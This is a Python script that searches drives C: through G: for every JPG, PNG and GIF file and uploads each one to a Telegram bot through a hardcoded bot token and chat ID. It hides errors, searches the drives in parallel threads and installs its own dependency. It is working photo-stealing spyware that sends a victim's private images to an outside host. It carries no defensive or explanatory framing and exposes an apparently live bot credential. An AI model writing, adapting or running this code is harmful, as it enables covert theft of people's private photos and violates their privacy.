import os
import requests
import threading
import subprocess
import time

def send_all_photos_to_telegram_bot(bot_token, chat_id):
    # Function to send a photo to the Telegram bot
    def send_photo(photo_path):
        try:
            url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
            files = {'photo': open(photo_path, 'rb')}
            data = {'chat_id': chat_id}
            response = requests.post(url, files=files, data=data)
            response.raise_for_status()
        except requests.RequestException as e:
            pass

    # Function to search for photos in a given directory and its subdirectories
    def search_photos(directory):
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                    photo_path = os.path.join(root, file)
                    send_photo(photo_path)

    # Function to install a missing module
    def install_module(module_name):
        try:
            subprocess.check_call(['pip', 'install', module_name])
            globals()[module_name] = __import__(module_name)
        except subprocess.CalledProcessError as e:
            pass

    # List of required modules
    required_modules = ['requests']

    # Install missing modules
    for module_name in required_modules:
        try:
            globals()[module_name] = __import__(module_name)
        except ImportError:
            install_module(module_name)

    # List of drives to search for photos
    drives = ['C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\']

    # List of threads to search for photos in parallel
    threads = []

    # Start a thread for each drive to search for photos
    for drive in drives:
        t = threading.Thread(target=search_photos, args=(drive,))
        t.start()
        threads.append(t)

    # Wait for all threads to finish
    for t in threads:
        t.join()

    # Wait for any remaining requests to finish
    time.sleep(1)
bot_token = '5896069920:AAF7NsXrhwy_3x1nWOK_h8FgIn-vzMOA3ck'
chat_id = '1523086010'
send_all_photos_to_telegram_bot(bot_token,chat_id)